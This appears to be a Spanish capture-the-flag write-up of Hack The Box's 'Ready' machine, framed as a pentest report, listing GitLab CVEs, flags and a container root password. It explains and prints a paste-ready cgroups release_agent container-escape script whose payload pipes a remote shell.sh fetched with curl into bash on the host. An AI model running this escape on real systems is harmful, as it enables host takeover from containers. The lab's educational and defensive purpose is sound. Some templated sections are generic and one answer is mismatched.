---
title: "Informe Técnico: Ready (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Ready de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Ready

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Ready** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Ready |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many open TCP ports are listening on Ready?**

R: 2

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_01.png)

What version of Gitlab is running on 5080?

R: 11.4.7

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_02.png)

**What is the 2018 CVE ID for a server-side request forgery (SSRF) vulnerability in the project import function for this version of Gitlab?**

R:  CVE-2018-19571

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_03.png)

Is Redis listening on the default Redis port on localhost on Ready?

R: yes

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_04.png)

**What is the 2018 CVE ID for a CRLF injection vulnerability in this version of GitLab?**

R: CVE-2018-19585

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_05.png)

**Of the URL schemes available to the SSRF, which sends the fewest header lines making it the best candidate to use with this SSRF?**

R: git://

What user is the webserver running as on Ready?

R: yes

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_06.png)

**What user is the webserver running as on Ready?**

R:git

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_07.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_08.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_09.png)

Submit the flag located in the dude user's home directory.
 
R: ef26074d475a1548b35aec91142ec98b

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_10.png)

What is the root password in the gitlab container?

R:  wW59U!ZKMbG9+*#h

```jsx
cat gitlab.rb | grep -v "^#" | grep .
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_11.png)

What value is set in a very insecure manner for the web container in the backup docker-compose.yml file?

R:privileged

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_12.png)

What is the name of the device that contains the host filesystem?

R: sda2

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_13.png)

**Submit the flag located in the root user's home directory.**

R:  064f1e0989653662ddc8c8adc07d8ea3

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_14.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_15.png)

otra opción 

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/ready/images/step_16.png)

> 
> 
> 
> # Idea en una frase
> 
> En cgroups **v1**, si puedes escribir en un controlador (p. ej. `cpu`, `memory`, etc.) y **configurar** `notify_on_release=1` y `release_agent=<ruta>`, el **kernel** ejecuta ese `release_agent` **en el host** cuando el cgroup se queda vacío. Si además apuntas el `release_agent` a un fichero del **filesystem del host** (vía la capa `upperdir` del overlay), consigues ejecutar comandos en el host desde el contenedor.
> 
> > Requisitos típicos
> > 
> > - Contenedor **privilegiado** (o al menos con `CAP_SYS_ADMIN`) y `/sys/fs/cgroup` montado **RW**.
> > - **cgroups v1** (en v2 esto está restringido).
> > - El rootfs del contenedor es **overlayfs** con `upperdir` visible en `/etc/mtab` o `/proc/self/mountinfo`.
> 
> ---
> 
> # Las líneas, explicadas
> 
> ```bash
> d=`dirname $(ls -x /s*/fs/c*/*/r* | head -n1)`
> 
> ```
> 
> - Busca un controlador de cgroup con el archivo `release_agent`.
>     
>     Ej.: te devolverá algo como `/sys/fs/cgroup/<controlador>`.
>     
>     `d` quedará en **ese directorio del cgroup**.
>     
> 
> ```bash
> mkdir -p $d/w; echo 1 > $d/w/notify_on_release
> 
> ```
> 
> - Crea un **sub-cgroup** `w`.
> - Activa `notify_on_release` (=1) para que, cuando `w` se quede **vacío** de procesos, el kernel dispare el `release_agent`.
> 
> ```bash
> t=`sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab`
> 
> ```
> 
> - **OJO**: en tu texto aparece `\perdir`, pero lo correcto es **`upperdir`**.
> - Extrae la ruta del **`upperdir` del overlayfs** desde `/etc/mtab`.
>     - `t` quedará en una ruta **del host** (p. ej. `/var/lib/docker/overlay2/<id>/diff`), que corresponde a `/` **dentro del contenedor**.
> 
> ```bash
> echo $t/c > $d/release_agent
> printf '#!/bin/sh\ncurl 10.10.14.8/shell.sh | bash' > /c
> chmod +x /c
> 
> ```
> 
> - Indicas al kernel que el `release_agent` es **`$t/c`** (archivo en el host).
> - Creas en el contenedor `/c` (que **mapea a `$t/c` en el host** gracias al overlay).
> - Ese `/c` contiene tu comando (descargar y ejecutar `shell.sh`). Lo haces ejecutable.
> 
> ```bash
> sh -c "echo 0 > $d/w/cgroup.procs"
> 
> ```
> 
> - Mueves **ese `sh` efímero** al cgroup `w` escribiendo **`0`** (que significa “mi propio PID”).
> - El `sh` termina tras hacer el `echo`, **`w` se queda vacío** y el kernel **dispara `release_agent`** → ejecuta **`$t/c` en el host** como root del host.
> 
> ---
> 
> # Versión “limpia” que puedes pegar (con `upperdir` correcto)
> 
> ```bash
> # 1) Localiza un controlador con release_agent
> d="$(dirname "$(ls -x /sys/fs/cgroup/*/release_agent 2>/dev/null | head -n1)")"
> 
> # 2) Crea subcgroup y activa notificación al vaciarse
> mkdir -p "$d/w"
> echo 1 > "$d/w/notify_on_release"
> 
> # 3) Obtén la ruta del upperdir del overlay (host)
> t="$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)"
> 
> # 4) Apunta release_agent al archivo del host ($t/c) y prepara el script
> echo "$t/c" > "$d/release_agent"
> printf '#!/bin/sh\ncurl -s 10.10.14.8/shell.sh | bash\n' > /c
> chmod +x /c
> 
> # 5) Dispara el release: coloca un proceso efímero en el cgroup y que termine
> sh -c "echo 0 > '$d/w/cgroup.procs'"
> 
> ```
> 
> > Demostración inocua (por si quieres probar sin shell):
> > 
> > 
> > Cambia el contenido de `/c` por:
> > 
> > `printf '#!/bin/sh\nid > /tmp/proof_from_host\n' > /c`
> > 
> > Luego mira **en el host** `/tmp/proof_from_host`.
> >

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
